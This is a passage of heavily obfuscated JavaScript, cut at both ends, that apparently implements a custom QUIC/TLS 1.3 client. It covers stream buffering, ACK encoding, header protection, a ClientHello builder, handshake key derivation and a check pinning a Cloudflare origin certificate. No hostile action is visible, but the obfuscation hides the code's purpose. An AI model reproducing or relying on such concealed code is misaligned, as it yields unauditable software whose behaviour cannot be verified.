        const j = h[jO(0xc54)] ? h[h['length'] - 0x1] : null, k = f[jO(0x6fd)](i[jO(0x373)], i[jO(0xc54)]);
        j && f[jO(0xde2)](i[jO(0x373)], f[jO(0x14b)](j['start'], j[jO(0xc54)])) ? j[jO(0xc54)] = Math[jO(0x37f)](j['length'], f[jO(0x913)](k, j[jO(0x373)])) : h[jO(0xb66)]({
            'start': i['start'],
            'length': i[jO(0xc54)]
        });
    }
    return h;
}
class a0ci {
    constructor(a) {
        const jP = a0d9, b = { 'lNEzx': '0|2|1|5|3|4|6' }, c = b['lNEzx'][jP(0xa6a)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[jP(0x9dd)] = a;
                continue;
            case '1':
                this['pending'] = [];
                continue;
            case '2':
                this['data'] = Buffer[jP(0x901)](0x0);
                continue;
            case '3':
                this[jP(0xb9c)] = 0x0;
                continue;
            case '4':
                this[jP(0xea6)] = ![];
                continue;
            case '5':
                this[jP(0x21f)] = [];
                continue;
            case '6':
                this[jP(0x3ad)] = ![];
                continue;
            }
            break;
        }
    }
    get [a0d9(0xb54)]() {
        const jQ = a0d9;
        return this[jQ(0xe83)]['length'];
    }
    [a0d9(0x4e1)](a, b) {
        const jR = a0d9, c = {
                'ZQzRO': function (d, f) {
                    return d - f;
                }
            };
        a[jR(0xc54)] && (this[jR(0xe83)] = Buffer[jR(0x83f)]([
            this['data'],
            a
        ]), this['pending'][jR(0xb66)]({
            'start': c[jR(0x1013)](this[jR(0xe83)][jR(0xc54)], a[jR(0xc54)]),
            'length': a['length']
        })), b && (this[jR(0xea6)] = !![], this[jR(0x3ad)] = !![]);
    }
    [a0d9(0x958)](a) {
        const jS = a0d9, b = {
                'HbFlN': function (g, h) {
                    return g + h;
                },
                'tejoE': function (g, h) {
                    return g < h;
                },
                'XRwSD': function (g, h, i) {
                    return g(h, i);
                }
            };
        if (!this['pending'][jS(0xc54)] || a <= 0x0)
            return null;
        const c = this[jS(0x50d)][0x0], d = Math['min'](c[jS(0xc54)], a), f = {
                'start': c[jS(0x373)],
                'length': d
            };
        return c[jS(0x373)] += d, c[jS(0xc54)] -= d, !c[jS(0xc54)] && this[jS(0x50d)][jS(0x719)](), f[jS(0xbce)] = this[jS(0xe83)][jS(0xad0)](f[jS(0x373)], b[jS(0x6fa)](f[jS(0x373)], d)), f['retransmitted'] = b[jS(0xb2c)](f[jS(0x373)], this[jS(0xb9c)]), this['frontier'] = Math[jS(0x37f)](this['frontier'], b[jS(0x6fa)](f[jS(0x373)], d)), this[jS(0x21f)] = b[jS(0xbd6)](a0ch, this[jS(0x21f)], [{
                'start': f[jS(0x373)],
                'length': d
            }]), f;
    }
    [a0d9(0x5f2)]() {
        const jT = a0d9;
        if (!this['fin'] || !this[jT(0x3ad)] || this['pending'][jT(0xc54)] || this[jT(0x21f)][jT(0xc54)])
            return ![];
        return this[jT(0x3ad)] = ![], !![];
    }
    ['ack'](a, b, c) {
        const jU = a0d9, d = {
                'WAPRQ': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'qDJna': function (f, g) {
                    return f + g;
                },
                'gqBEF': function (f, g) {
                    return f >= g;
                }
            };
        this[jU(0x21f)] = d['WAPRQ'](a0cg, this[jU(0x21f)], a, d[jU(0x13b)](a, b)), c && this[jU(0xea6)] && d['gqBEF'](a + b, this[jU(0xe83)]['length']) && (this[jU(0x3ad)] = ![]), this[jU(0x9dd)][jU(0x6c2)]();
    }
    [a0d9(0x55e)]() {
        const jV = a0d9, a = {
                'BsnOF': function (b, c, d) {
                    return b(c, d);
                }
            };
        this['unacked'][jV(0xc54)] && (this['frontier'] = this['unacked'][0x0][jV(0x373)], this[jV(0x50d)] = a[jV(0xd8c)](a0ch, this[jV(0x50d)], this[jV(0x21f)])[jV(0xcd4)]((c, d) => c['start'] - d[jV(0x373)]), this[jV(0x21f)] = []), this[jV(0xea6)] && (this[jV(0x3ad)] = !![]);
    }
    [a0d9(0x831)](a) {
        const jW = a0d9, b = {
                'XkrxT': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'jQXps': function (c, d) {
                    return c + d;
                },
                'UeIld': function (c, d, f) {
                    return c(d, f);
                }
            };
        for (const c of a) {
            if (!c[jW(0xc54)]) {
                c[jW(0xea6)] && this[jW(0xea6)] && (this[jW(0x3ad)] = !![]);
                continue;
            }
            this[jW(0x21f)] = b[jW(0xaf6)](a0cg, this['unacked'], c[jW(0x373)], b['jQXps'](c['start'], c[jW(0xc54)])), this[jW(0x50d)] = b['UeIld'](a0ch, this[jW(0x50d)], [{
                    'start': c[jW(0x373)],
                    'length': c[jW(0xc54)]
                }])[jW(0xcd4)]((d, f) => d[jW(0x373)] - f[jW(0x373)]);
        }
    }
    ['idle']() {
        const jX = a0d9;
        return !this[jX(0x50d)][jX(0xc54)] && !this[jX(0x21f)][jX(0xc54)] && !this[jX(0x3ad)];
    }
}
class a0cj {
    constructor() {
        const jY = a0d9;
        this[jY(0xdf1)] = 0x0, this[jY(0x50d)] = [];
    }
    [a0d9(0x85a)](a, b) {
        const jZ = a0d9, c = {
                'vqhZC': function (f, g) {
                    return f + g;
                },
                'grEDO': function (f, g) {
                    return f >= g;
                },
                'TAhOO': function (f, g) {
                    return f !== g;
                },
                'Qpjgp': function (f, g) {
                    return f === g;
                }
            };
        if (a > c[jZ(0x534)](this[jZ(0xdf1)], 0x100000))
            return Buffer[jZ(0x901)](0x0);
        if (a < this[jZ(0xdf1)]) {
            const f = this[jZ(0xdf1)] - a;
            if (c[jZ(0x9cc)](f, b[jZ(0xc54)]))
                return Buffer[jZ(0x901)](0x0);
            b = b[jZ(0xad0)](f), a = this[jZ(0xdf1)];
        }
        if (!b['length'])
            return Buffer['alloc'](0x0);
        if (c[jZ(0x541)](a, this[jZ(0xdf1)]))
            return this['pending'][jZ(0xb66)]({
                'start': a,
                'bytes': Buffer[jZ(0xca5)](b)
            }), Buffer['alloc'](0x0);
        const d = [b];
        this['contiguous'] += b[jZ(0xc54)];
        for (let g = !![]; g;) {
            g = ![];
            for (let h = 0x0; h < this[jZ(0x50d)][jZ(0xc54)]; h++) {
                if (c[jZ(0x4de)](this[jZ(0x50d)][h]['start'], this[jZ(0xdf1)])) {
                    d['push'](this['pending'][h][jZ(0xbce)]), this[jZ(0xdf1)] += this['pending'][h][jZ(0xbce)][jZ(0xc54)], this[jZ(0x50d)][jZ(0x8ee)](h, 0x1), g = !![];
                    break;
                }
            }
        }
        return Buffer[jZ(0x83f)](d);
    }
}
function a0ck(a, b, c, d) {
    const k0 = a0d9, f = {
            'oXoBw': function (j, k) {
                return j + k;
            },
            'FyPkb': function (j, k) {
                return j + k;
            },
            'osyNK': function (j, k) {
                return j & k;
            }
        };
    if (b[k0(0xc54)] < f[k0(0xcc0)](c, 0x4) + a0bV)
        return null;
    const g = a[k0(0x62b)](b['subarray'](f[k0(0xb4d)](c, 0x4), f[k0(0xb4d)](f[k0(0xcc0)](c, 0x4), a0bV))), h = Buffer['from'](b);
    h[0x0] ^= f[k0(0x1024)](g[0x0], d ? 0xf : 0x1f);
    for (let j = 0x0; j < a0bW; j++) {
        h[f[k0(0xcc0)](c, j)] ^= g[f['FyPkb'](0x1, j)];
    }
    return h;
}
function a0cl(a, b, c, d) {
    const k1 = a0d9, f = {
            'QOVnx': function (l, m) {
                return l < m;
            },
            'vubki': function (l, m) {
                return l + m;
            },
            'pqqwN': function (l, m) {
                return l + m;
            },
            'NKrop': function (l, m) {
                return l & m;
            },
            'oDEaK': function (l, m) {
                return l + m;
            },
            'BQeBG': function (l, m) {
                return l * m;
            },
            'EbdPe': function (l, m) {
                return l + m;
            }
        };
    if (f[k1(0x916)](b[k1(0xc54)], f['vubki'](f[k1(0x94e)](c, 0x4), a0bV)))
        return null;
    const g = a[k1(0x62b)](b[k1(0xad0)](c + 0x4, f[k1(0x94e)](f[k1(0x94e)](c, 0x4), a0bV))), h = Buffer[k1(0xca5)](b);
    h[0x0] ^= f[k1(0xa1d)](g[0x0], d ? 0xf : 0x1f);
    const j = f[k1(0x1000)](f['NKrop'](h[0x0], 0x3), 0x1);
    for (let l = 0x0; f[k1(0x916)](l, j); l++) {
        h[c + l] ^= g[f[k1(0x94e)](0x1, l)];
    }
    let k = 0x0;
    for (let m = 0x0; f['QOVnx'](m, j); m++) {
        k = f[k1(0x1000)](f[k1(0x714)](k, 0x100), h[f[k1(0x27b)](c, m)]);
    }
    return [
        h[k1(0xad0)](0x0, c + j),
        k
    ];
}
function a0cm(a, b, c) {
    const k2 = a0d9, d = {
            'tdxtn': function (j, k) {
                return j(k);
            },
            'FHnWx': function (j, k) {
                return j - k;
            },
            'posDa': function (j, k) {
                return j << k;
            },
            'xVepG': function (j, k) {
                return j & k;
            },
            'JUtiJ': function (j, k) {
                return j << k;
            },
            'BTEUD': function (j, k) {
                return j <= k;
            },
            'NiAZj': function (j, k) {
                return j + k;
            },
            'OsvOk': function (j, k) {
                return j << k;
            },
            'cvUDH': function (j, k) {
                return j(k);
            },
            'RdpRk': function (j, k) {
                return j > k;
            },
            'GAEKv': function (j, k) {
                return j + k;
            },
            'jsPqj': function (j, k) {
                return j >= k;
            },
            'mqsiU': function (j, k) {
                return j << k;
            },
            'DlssS': function (j, k) {
                return j(k);
            }
        }, f = d['tdxtn'](BigInt, a) + 0x1n, g = d['FHnWx'](d['posDa'](0x1n, d[k2(0xbe2)](BigInt, b)), 0x1n);
    let h = d['xVepG'](f, ~g) | BigInt(c);
    const i = d[k2(0x917)](0x1n, BigInt(d[k2(0xcae)](b, 0x1)));
    if (d[k2(0x297)](d[k2(0xa9d)](h, i), f))
        h += d[k2(0x2f5)](0x1n, d[k2(0xdef)](BigInt, b));
    else
        d[k2(0x852)](h, d[k2(0x356)](f, i)) && d[k2(0x6be)](h, d['mqsiU'](0x1n, BigInt(b))) && (h -= d[k2(0x2f5)](0x1n, BigInt(b)));
    return d[k2(0x164)](Number, h);
}
function a0cn(a) {
    const k3 = a0d9, b = {
            'WAMeI': function (j, k) {
                return j - k;
            },
            'uXkns': function (j, k) {
                return j + k;
            },
            'gvfWl': function (j, k) {
                return j - k;
            },
            'WcCfe': function (j, k) {
                return j >= k;
            },
            'iNuLV': function (j, k) {
                return j + k;
            },
            'HTQZC': function (j, k) {
                return j - k;
            }
        }, c = new a0c8();
    c[k3(0x73b)](a0c3[k3(0x694)]);
    const d = a[k3(0x47b)]()[k3(0xcd4)]((j, k) => j[k3(0x373)] - k[k3(0x373)]), f = d[b[k3(0xe0c)](d[k3(0xc54)], 0x1)], g = b[k3(0xe0c)](b[k3(0x7bf)](f[k3(0x373)], f['length']), 0x1);
    c['varint'](g), c[k3(0x18d)](0x0), c['varint'](b[k3(0x79d)](d[k3(0xc54)], 0x1)), c[k3(0x18d)](b[k3(0xe0c)](g, f['start']));
    let h = f['start'];
    for (let j = b[k3(0x79d)](d[k3(0xc54)], 0x2); b['WcCfe'](j, 0x0); j--) {
        const k = d[j], l = b[k3(0xe0c)](b['iNuLV'](k[k3(0x373)], k[k3(0xc54)]), 0x1);
        c[k3(0x18d)](b[k3(0xe0c)](b[k3(0x9a4)](h, l), 0x2)), c['varint'](l - k[k3(0x373)]), h = k[k3(0x373)];
    }
    return c[k3(0x96c)]();
}
function a0co(a) {
    const k4 = a0d9, b = {
            'lfwsh': function (k, l) {
                return k - l;
            },
            'HePzN': function (k, l) {
                return k + l;
            },
            'bXTGg': function (k, l) {
                return k - l;
            },
            'WPBDk': function (k, l) {
                return k / l;
            }
        }, c = a[k4(0x31f)](), d = a[k4(0x31f)](), f = a[k4(0x31f)](), g = a[k4(0x31f)](), h = [{
                'start': b[k4(0x154)](c, g),
                'length': b[k4(0x5ba)](g, 0x1)
            }];
    let j = b['bXTGg'](c, g);
    for (let k = 0x0; k < f; k++) {
        const l = a['number'](), m = a[k4(0x31f)](), n = b['lfwsh'](b[k4(0x154)](j, l), 0x2);
        h[k4(0xb66)]({
            'start': n - m,
            'length': b['HePzN'](m, 0x1)
        }), j = b[k4(0x154)](n, m);
    }
    return h[k4(0xb2e)] = b[k4(0x8d2)](d, 0x3e8), h;
}
function a0cp(a) {
    const k5 = a0d9, b = {
            'SHCFD': function (f, g) {
                return f > g;
            },
            'uiuJu': function (f, g) {
                return f(g);
            },
            'YBAFG': function (f, g) {
                return f < g;
            },
            'EvCQO': function (f, g) {
                return f === g;
            },
            'pruWp': function (f, g) {
                return f === g;
            },
            'TTXOB': function (f, g) {
                return f === g;
            },
            'FWdzS': function (f, g) {
                return f * g;
            }
        }, c = {}, d = new a0c9(a);
    while (b['SHCFD'](d[k5(0x190)], 0x0)) {
        const f = b[k5(0x8ba)](Number, d[k5(0x18d)]()), g = d['number']();
        if (b['YBAFG'](d[k5(0x190)], g))
            break;
        const h = d[k5(0xbce)](g);
        if (b[k5(0x22e)](h[k5(0xc54)], 0x1) || b[k5(0x2bc)](h['length'], 0x2) || h[k5(0xc54)] === 0x4 || b[k5(0x200)](h['length'], 0x8)) {
            let i = 0x0;
            for (const j of h) {
                i = b[k5(0xe30)](i, 0x100) + j;
            }
            c[f] = i;
        } else
            c[f] = Buffer[k5(0xca5)](h);
    }
    return c;
}
function a0cq(a) {
    const k6 = a0d9, b = {
            'kabrV': function (d, f) {
                return d(f);
            }
        }, c = new a0c8();
    for (const [d, f] of a) {
        let g;
        if (Buffer[k6(0x24f)](f))
            g = f;
        else
            f === !![] ? g = Buffer[k6(0x901)](0x0) : g = b[k6(0x1c3)](a0c6, f);
        c[k6(0x18d)](d), c[k6(0x18d)](g['length']), c['bytes'](g);
    }
    return c[k6(0x96c)]();
}
function a0cr(a, b) {
    const k7 = a0d9, c = Buffer[k7(0x901)](0x4);
    return c[0x0] = a, c[k7(0xd1e)](b[k7(0xc54)], 0x1, 0x3), Buffer['concat']([
        c,
        b
    ]);
}
function a0cs(a, b) {
    const k8 = a0d9, c = Buffer[k8(0x901)](0x4);
    return c[k8(0x589)](a, 0x0), c[k8(0x589)](b[k8(0xc54)], 0x2), Buffer[k8(0x83f)]([
        c,
        b
    ]);
}
class a0ct {
    constructor(a, b, c) {
        const k9 = a0d9, d = {
                'JDOBy': k9(0x210),
                'GgMTU': 'spki',
                'LlanL': k9(0xe2d),
                'VMSXf': k9(0x373),
                'LdbOt': k9(0xfeb)
            }, f = d[k9(0x4b1)][k9(0xa6a)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[k9(0xe5d)] = this[k9(0x4e2)][k9(0xe5d)]['export']({
                    'type': d[k9(0x897)],
                    'format': d[k9(0x651)]
                })['subarray'](-0x20);
                continue;
            case '1':
                this['remoteParameters'] = null;
                continue;
            case '2':
                this[k9(0x982)] = k9(0x334);
                continue;
            case '3':
                this[k9(0xe35)] = b;
                continue;
            case '4':
                this[k9(0xc3e)] = d[k9(0x7a2)];
                continue;
            case '5':
                this[k9(0x101c)] = c;
                continue;
            case '6':
                this[k9(0xbc4)] = 'sha256';
                continue;
            case '7':
                this[k9(0x4e2)] = a0k[k9(0x8d9)](d[k9(0x876)]);
                continue;
            case '8':
                this['serverName'] = a;
                continue;
            case '9':
                this[k9(0xe4b)] = 0x20;
                continue;
            case '10':
                this[k9(0xb51)] = null;
                continue;
            case '11':
                this[k9(0x367)] = [];
                continue;
            case '12':
                this['negotiatedAlpn'] = null;
                continue;
            }
            break;
        }
    }
    [a0d9(0x439)](a) {
        const ka = a0d9, b = {
                'lMAjq': function (f, g) {
                    return f === g;
                }
            }, c = a0k['createHash'](this[ka(0xbc4)]), d = b['lMAjq'](a, undefined) ? this[ka(0x367)] : this[ka(0x367)]['slice'](0x0, a);
        for (const f of d) {
            c[ka(0x19c)](f);
        }
        return c[ka(0x61c)]();
    }
    [a0d9(0x9cf)]() {
        const kb = a0d9, a = {
                'yPZMR': kb(0xec2),
                'iuGDg': function (p, q) {
                    return p + q;
                },
                'JGBTo': function (p, q, r) {
                    return p(q, r);
                },
                'jKgCG': function (p, q, r) {
                    return p(q, r);
                },
                'izuJB': function (p, q) {
                    return p & q;
                },
                'pKMzM': function (p, q, r) {
                    return p(q, r);
                },
                'fsVVM': kb(0x1fa)
            }, b = Buffer[kb(0xca5)](this[kb(0xd6c)], a[kb(0x443)]), c = new a0c8()['u16'](a[kb(0xf05)](b['length'], 0x3))['byte'](0x0)[kb(0x38c)](b[kb(0xc54)])[kb(0xbce)](b)[kb(0x96c)](), d = new a0c8()['u16'](0x4)['u16'](0x1d)[kb(0x38c)](0x17)['build'](), f = new a0c8()['u16'](0x8)[kb(0x38c)](0x403)[kb(0x38c)](0x804)[kb(0x38c)](0x401)['u16'](0x807)['build'](), g = new a0c8()[kb(0x73b)](0x2)[kb(0x38c)](0x304)['build'](), h = new a0c8()['u16'](a['iuGDg'](0x4, this[kb(0xe5d)][kb(0xc54)]))[kb(0x38c)](0x1d)[kb(0x38c)](this[kb(0xe5d)][kb(0xc54)])[kb(0xbce)](this['publicKey'])['build'](), i = Buffer[kb(0x83f)]([
                Buffer[kb(0xca5)]([this[kb(0xe35)][kb(0xc54)]]),
                Buffer[kb(0xca5)](this[kb(0xe35)], a[kb(0x443)])
            ]), j = new a0c8()[kb(0x38c)](i['length'])[kb(0xbce)](i)[kb(0x96c)](), k = new a0c8()[kb(0x73b)](0x1)[kb(0x73b)](0x1)[kb(0x96c)](), l = Buffer[kb(0x83f)]([
                a['JGBTo'](a0cs, 0x0, c),
                a0cs(0xa, d),
                a['JGBTo'](a0cs, 0xd, f),
                a0cs(0x2b, g),
                a0cs(0x33, h),
                a['JGBTo'](a0cs, 0x10, j),
                a['jKgCG'](a0cs, 0x2d, k),
                a['JGBTo'](a0cs, 0xff01, Buffer[kb(0xca5)]([0x0])),
                a[kb(0xd62)](a0cs, 0x39, this[kb(0x101c)])
            ]), m = Buffer[kb(0xca5)]([
                0x0,
                0x4,
                0x13,
                0x1,
                0x13,
                0x2
            ]), n = Buffer[kb(0x83f)]([
                Buffer[kb(0xca5)]([
                    0x3,
                    0x3
                ]),
                a0k['randomBytes'](0x20),
                Buffer['from']([0x0]),
                m,
                Buffer['from']([
                    0x1,
                    0x0
                ]),
                Buffer[kb(0xca5)]([
                    l[kb(0xc54)] >> 0x8 & 0xff,
                    a[kb(0xe45)](l['length'], 0xff)
                ]),
                l
            ]), o = a[kb(0x4fd)](a0cr, 0x1, n);
        return this[kb(0x367)][kb(0xb66)](o), this['state'] = a[kb(0x3e6)], o;
    }
    [a0d9(0xf0c)](a) {
        const kc = a0d9, b = {
                'PZcIa': function (d, f) {
                    return d < f;
                },
                'iruwi': function (d, f) {
                    return d !== f;
                },
                'XsKiM': kc(0xf71),
                'pLauc': function (d, f) {
                    return d < f;
                },
                'oOuBo': function (d, f) {
                    return d + f;
                }
            };
        if (b[kc(0xb91)](a['length'], 0x4))
            return null;
        if (b[kc(0x8a3)](a[0x0], 0x2))
            throw new Error(b['XsKiM']);
        const c = a[kc(0x4bc)](0x1, 0x3);
        if (b['pLauc'](a[kc(0xc54)], 0x4 + c))
            return null;
        return a[kc(0xad0)](0x0, b[kc(0x955)](0x4, c));
    }
    ['handleServerHello'](a) {
        const kd = a0d9, b = {
                'dzGns': kd(0xa15),
                'ndTin': function (q, r) {
                    return q < r;
                },
                'gOoPv': function (q, r) {
                    return q >= r;
                },
                'TEPVZ': function (q, r) {
                    return q === r;
                },
                'BhwAP': function (q, r) {
                    return q >= r;
                },
                'wTXTx': function (q, r) {
                    return q >= r;
                },
                'TcgDT': function (q, r) {
                    return q !== r;
                },
                'CGXfQ': kd(0xcb8),
                'wohQe': kd(0x5e9),
                'IGygx': kd(0x636),
                'Gabgk': function (q, r) {
                    return q === r;
                },
                'tDoBw': 'sha256',
                'qHNhi': kd(0x334),
                'xGMxe': kd(0x619),
                'wYpck': kd(0x5a6),
                'vQinE': kd(0x647),
                'LaxQt': kd(0x501),
                'DvEgs': kd(0x1a2),
                'WsUXM': kd(0x9f4),
                'gqSpN': function (q, r, s, t) {
                    return q(r, s, t);
                },
                'jEuoI': kd(0xd66),
                'NqnMM': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'irZye': kd(0xea3)
            }, c = new a0c9(a[kd(0xad0)](0x4));
        c['u16']();
        const d = c[kd(0xbce)](0x20);
        if (d['equals'](a0bU))
            throw new Error(b[kd(0xecf)]);
        const f = c[kd(0xbce)](c[kd(0x73b)]()), g = c[kd(0x38c)]();
        c[kd(0x73b)]();
        let h = null;
        const i = c[kd(0x38c)]();
        let j = 0x0;
        while (b[kd(0xd14)](j, i) && b[kd(0x1d6)](c[kd(0x190)], 0x4)) {
            const q = c[kd(0x38c)](), r = c[kd(0x38c)](), s = c['bytes'](r);
            j += 0x1;
            if (b[kd(0x5f6)](q, 0x33) && b['BhwAP'](s[kd(0xc54)], 0x4)) {
                const t = new a0c9(s), u = t['u16'](), v = t[kd(0x38c)]();
                h = {
                    'group': u,
                    'key': t[kd(0xbce)](v)
                };
            } else {
                if (q === 0x2b && b[kd(0xfcb)](s[kd(0xc54)], 0x2)) {
                    if (b[kd(0x105f)](s[kd(0xc6f)](0x0), 0x304))
                        throw new Error(b[kd(0x4e9)]);
                }
            }
        }
        if (h === null)
            throw new Error(b['wohQe']);
        if (b['TcgDT'](h[kd(0xf8d)], 0x1d))
            throw new Error(b[kd(0xd03)] + h[kd(0xf8d)]);
        if (b[kd(0x669)](g, 0x1301))
            this[kd(0xbc4)] = b['tDoBw'], this[kd(0xe4b)] = 0x20, this[kd(0x982)] = b['qHNhi'];
        else {
            if (g === 0x1302)
                this[kd(0xbc4)] = b[kd(0x4ca)], this['hashLength'] = 0x30, this[kd(0x982)] = b['wYpck'];
            else
                throw new Error(b['vQinE'] + g[kd(0x43a)](0x10));
        }
        this[kd(0x367)][kd(0xb66)](a);
        const k = a0k[kd(0xea0)]({
                'key': Buffer[kd(0x83f)]([
                    Buffer[kd(0xca5)](b[kd(0x2b4)], b[kd(0x384)]),
                    h['key']
                ]),
                'format': kd(0xe2d),
                'type': b[kd(0xd02)]
            }), l = a0k['diffieHellman']({
                'privateKey': this[kd(0x4e2)][kd(0xe55)],
                'publicKey': k
            }), m = Buffer['alloc'](this['hashLength']), n = b['gqSpN'](a0ca, this[kd(0xbc4)], m, m), o = a0cc(this[kd(0xbc4)], n, b['jEuoI'], a0k[kd(0x282)](this[kd(0xbc4)])[kd(0x61c)](), this[kd(0xe4b)]);
        this['handshakeSecret'] = b['gqSpN'](a0ca, this[kd(0xbc4)], o, l);
        const p = this[kd(0x439)]();
        return this[kd(0x44b)] = b[kd(0x2dc)](a0cc, this[kd(0xbc4)], this['handshakeSecret'], b[kd(0xf02)], p, this[kd(0xe4b)]), this[kd(0x5c0)] = b[kd(0x2dc)](a0cc, this[kd(0xbc4)], this['handshakeSecret'], kd(0x2f7), p, this[kd(0xe4b)]), this[kd(0xc3e)] = kd(0xc19), {
            'send': new a0cd(this[kd(0xbc4)], this[kd(0x982)], this[kd(0x44b)]),
            'recv': new a0cd(this[kd(0xbc4)], this[kd(0x982)], this[kd(0x5c0)])
        };
    }
    [a0d9(0xd45)](a) {
        const ke = a0d9, b = {
                'octeg': function (u, v) {
                    return u === v;
                },
                'VsZdo': function (u, v) {
                    return u >= v;
                },
                'NXOcR': function (u, v) {
                    return u(v);
                },
                'GsStA': function (u, v) {
                    return u >= v;
                },
                'JKdvD': function (u, v) {
                    return u === v;
                },
                'yKAqv': function (u, v) {
                    return u <= v;
                },
                'VGHlN': function (u, v) {
                    return u + v;
                },
                'BmvtR': function (u, v) {
                    return u + v;
                },
                'vSMPQ': function (u, v) {
                    return u > v;
                },
                'NfbzL': function (u, v) {
                    return u === v;
                },
                'NCDtz': function (u, v) {
                    return u !== v;
                },
                'nBcIE': function (u, v) {
                    return u - v;
                },
                'RdIUh': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'RhQAl': ke(0x329),
                'Jdxzo': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'SRGFz': 'derived',
                'DowFS': ke(0x942),
                'ZlQBh': ke(0x759),
                'ykGwd': ke(0x7e7)
            };
        this[ke(0x367)][ke(0xb66)](a);
        const c = a[0x0];
        if (b[ke(0x2c6)](c, 0x8)) {
            const u = new a0c9(a['subarray'](0x4)), v = u[ke(0x38c)]();
            let w = 0x0;
            while (w < v && b[ke(0xcb1)](u['remaining'], 0x4)) {
                const x = u['u16'](), y = u[ke(0x38c)](), z = u[ke(0xbce)](y);
                w += 0x1;
                if (x === 0x39)
                    this[ke(0x3d8)] = b['NXOcR'](a0cp, Buffer['from'](z));
                else
                    b['octeg'](x, 0x10) && b[ke(0x944)](z[ke(0xc54)], 0x3) && (this[ke(0xfb3)] = z['subarray'](0x3)[ke(0x43a)](ke(0xec2)));
            }
            return null;
        }
        if (b[ke(0x87d)](c, 0xb)) {
            const A = a[ke(0xad0)](0x4);
            if (A['length'] >= 0x4) {
                const B = 0x1 + A[0x0];
                if (b[ke(0x931)](b['VGHlN'](B, 0x3), A['length'])) {
                    const C = A[ke(0x4bc)](B, 0x3);
                    if (b[ke(0x931)](b[ke(0xbf4)](B + 0x3, C), A['length']) && b['GsStA'](C, 0x3)) {
                        const D = A[ke(0x4bc)](b[ke(0x67f)](B, 0x3), 0x3);
                        b[ke(0x5de)](D, 0x0) && b['yKAqv'](b[ke(0x67f)](b[ke(0x67f)](B, 0x6), D), A[ke(0xc54)]) && (this[ke(0xb51)] = Buffer[ke(0xca5)](A['subarray'](b[ke(0xbf4)](B, 0x6), b[ke(0xbf4)](B + 0x6, D))));
                    }
                }
            }
            return null;
        }
        if (b[ke(0x5b9)](c, 0xf) || b[ke(0x87d)](c, 0x4))
            return null;
        if (b[ke(0x946)](c, 0x14))
            return null;
        const d = this['messages'][b[ke(0x9b9)](this[ke(0x367)][ke(0xc54)], 0x1)], f = d[ke(0xad0)](0x4), g = this[ke(0x439)](b[ke(0x9b9)](this['messages'][ke(0xc54)], 0x1)), h = b[ke(0x408)](a0cc, this['hash'], this[ke(0x5c0)], b[ke(0xdbd)], Buffer['alloc'](0x0), this[ke(0xe4b)]), i = a0k[ke(0x16e)](this['hash'], h)[ke(0x19c)](g)[ke(0x61c)](), j = i[ke(0xc54)] === f['length'] && a0k[ke(0xa96)](i, f), k = b[ke(0x321)](a0cc, this[ke(0xbc4)], this[ke(0x44b)], b[ke(0xdbd)], Buffer[ke(0x901)](0x0), this[ke(0xe4b)]), l = this[ke(0x439)](), m = a0k[ke(0x16e)](this[ke(0xbc4)], k)[ke(0x19c)](l)[ke(0x61c)](), n = a0cr(0x14, m), o = Buffer[ke(0x901)](this[ke(0xe4b)]), p = b[ke(0x408)](a0cc, this[ke(0xbc4)], this[ke(0x6b3)], b['SRGFz'], a0k[ke(0x282)](this[ke(0xbc4)])[ke(0x61c)](), this[ke(0xe4b)]), q = a0ca(this[ke(0xbc4)], p, o), r = this[ke(0x439)]();
        this[ke(0x367)][ke(0xb66)](n);
        const s = b[ke(0x321)](a0cc, this['hash'], q, b[ke(0x1a0)], r, this[ke(0xe4b)]), t = b['Jdxzo'](a0cc, this['hash'], q, b[ke(0xee6)], r, this['hashLength']);
        return this[ke(0xc3e)] = b['ykGwd'], {
            'verified': j,
            'finished': n,
            'send': new a0cd(this[ke(0xbc4)], this[ke(0x982)], s),
            'recv': new a0cd(this[ke(0xbc4)], this[ke(0x982)], t)
        };
    }
}
function a0cu(a) {
    const kf = a0d9, b = {
            'oZupU': kf(0xff4),
            'GDcMh': function (k, l) {
                return k === l;
            },
            'OfjRr': kf(0x9e7),
            'OHVQM': kf(0x743),
            'XTPUQ': function (k, l) {
                return k + l;
            },
            'NfJXP': function (k, l) {
                return k(l);
            },
            'mwqfM': kf(0x6b7),
            'ShNGp': kf(0xf9a),
            'ujSCH': kf(0x7c5),
            'kixnD': 'CN=CloudFlare\x20Origin\x20Certificate',
            'msqZu': function (k, l) {
                return k + l;
            },
            'zmOdn': kf(0x1f6),
            'nFTeS': function (k, l) {
                return k + l;
            },
            'POYfR': kf(0x721),
            'gzWbE': function (k, l) {
                return k(l);
            }
        };
    if (!a || !a[kf(0xc54)])
        return b[kf(0x844)];
    let c;
    try {
        c = new a0k[(kf(0x87b))](a);
    } catch (k) {
        return b[kf(0x39c)](kf(0x6cc), k[kf(0x769)]);
    }
    const d = l => String(l || '')[kf(0x8d4)](/\\,/g, ','), f = b[kf(0x50b)](d, c[kf(0x38b)]), g = d(c[kf(0x507)]);
    if (!f[kf(0x152)](kf(0x592)))
        return b[kf(0x103c)] + f;
    if (!f[kf(0x152)](b['ShNGp']))
        return b[kf(0x39c)](b[kf(0xabe)], f);
    if (!g[kf(0x152)](b[kf(0x784)]))
        return b[kf(0xc63)](kf(0x322), g);
    const h = b[kf(0x50b)](String, c[kf(0x768)] || '')['split'](',')[kf(0xf2e)](l => l[kf(0x5b0)]()[kf(0x544)]()), i = b[kf(0xc69)], j = h['some'](l => {
            const kg = kf;
            if (!l['startsWith'](b['oZupU']))
                return ![];
            const m = l[kg(0x47b)](0x4);
            return b['GDcMh'](m, i) || b[kg(0x7de)](m, b['OfjRr']) || m['startsWith']('*.') && i['endsWith'](m[kg(0x47b)](0x1));
        });
    if (!j)
        return b[kf(0x39c)](b['nFTeS'](b[kf(0xeed)], b['gzWbE'](String, c[kf(0x768)] || '')), ')');
    return null;
}
class a0cv {
    constructor(a, b, c) {
        const kh = a0d9, d = kh(0x3da)[kh(0xa6a)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this[kh(0xddd)] = new a0cj();
                continue;
            case '1':
                this[kh(0x5fa)] = null;
                continue;
            case '2':
                this[kh(0x6e0)] = ![];
                continue;
            case '3':
